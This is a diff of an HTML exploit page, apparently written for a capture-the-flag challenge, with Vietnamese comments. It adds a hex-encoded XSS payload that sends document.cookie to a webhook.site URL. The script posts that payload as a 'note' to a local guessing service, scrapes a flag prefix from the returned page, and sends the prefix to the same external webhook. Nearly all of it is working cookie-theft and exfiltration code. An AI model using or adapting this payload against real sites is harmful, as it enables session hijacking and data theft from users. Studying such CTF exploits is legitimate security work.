@@ -8,23 +8,31 @@
   <h2>Auto Guess Payload Running...</h2>
   <script>
 (async () => {
+  // 1. Hex encode script bạn muốn chèn vào "note"
+  const payload = `
+    <img src=1 onerror="fetch('http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?cookie=' + document.cookie)">
+  `.trim();
+
+  const hex = [...payload].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+
+  // 2. Gửi guess + note (hex)
   await fetch("http://127.0.0.1:5000/guess", {
     method: "POST",
     credentials: "include",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       guess: "NHNC{",
-      note: "3c7363726970743e616c657274282768656c6c6f27293c2f7363726970743e"
+      note: hex
     })
   });
 
-  // Fetch inner.html để lấy thông tin đã lưu
+  // 3. Sau đó load lại inner.html và lấy kết quả flag prefix
   const res = await fetch("http://127.0.0.1:5000/inner.html", { credentials: "include" });
   const html = await res.text();
-  const prefix = html.match(/<span id="best-prefix">(.*?)<\/span>/)[1];
+  const prefix = html.match(/<span id="best-prefix">(.*?)<\/span>/)?.[1] || 'no-match';
 
-  // Gửi về webhook
-  await fetch("https://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?leak=" + encodeURIComponent(prefix));
+  // 4. Leak ra ngoài
+  await fetch("http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?prefix=" + encodeURIComponent(prefix));
 })();
 </script>
 </body>
